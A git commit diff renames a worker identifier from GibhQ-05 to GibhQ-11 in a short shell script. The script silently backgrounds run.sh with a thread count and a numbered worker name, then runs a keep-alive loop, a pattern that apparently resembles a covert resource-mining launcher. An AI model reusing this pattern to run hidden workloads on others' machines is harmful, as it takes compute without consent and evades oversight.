843484d0ce2bd3484ee6acc5b2b07d24079f5013
andrygibhq01 <andrygibhq01@gmail.com>
2026-03-01 23:14:01 +0700

    Update bas.sh

--- bas.sh
+++ bas.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 
-cd app && chmod 777 run.sh && nproc --all && ./run.sh 7 GibhQ-05 >/dev/null 2>&1 &
+cd app && chmod 777 run.sh && nproc --all && ./run.sh 7 GibhQ-11 >/dev/null 2>&1 &
 sleep 60
 while true
 do
